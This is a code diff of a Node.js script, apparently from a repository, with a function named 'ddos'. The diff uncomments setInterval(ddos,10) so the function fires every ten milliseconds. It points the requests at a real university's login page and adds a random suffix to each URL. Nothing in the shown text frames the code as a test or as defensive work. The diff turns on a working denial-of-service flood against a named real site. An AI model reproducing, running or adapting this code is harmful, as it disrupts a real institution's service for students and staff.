@@ -16,7 +16,7 @@ res.end()
 // ddos(msg.initial)
 // })
 
-// setInterval(ddos,10)
+setInterval(ddos,10)
 // console.log("attack starts")
 var count=0;
 function ddos(){
@@ -25,7 +25,7 @@ function ddos(){
     // const uril ="http://tatras4.herokuapp.com?index=0&count=3"
     // console.log(uril)
     const extra="pics"+Math.random()
-    const uril="https://www.iiserkol.ac.in/web/en/#gsc.tab=0/"+extra
+    const uril="https://welearn.iiserkol.ac.in/login/index.php"+extra
     //const uril="https://welearn.iiserkol.ac.in/login/index.php"
     // count=count+1;
     // if(count>=botArray.length) count=0;
@@ -40,7 +40,7 @@ function ddos(){
         // The whole response has been received. Print out the result.
         resp.on('end', () => {
             // console.log(pythonData + botArray[count-4])
-            // console.log(pythonData)
+            console.log(pythonData)
         });
       
       }).on("error", (err) => {
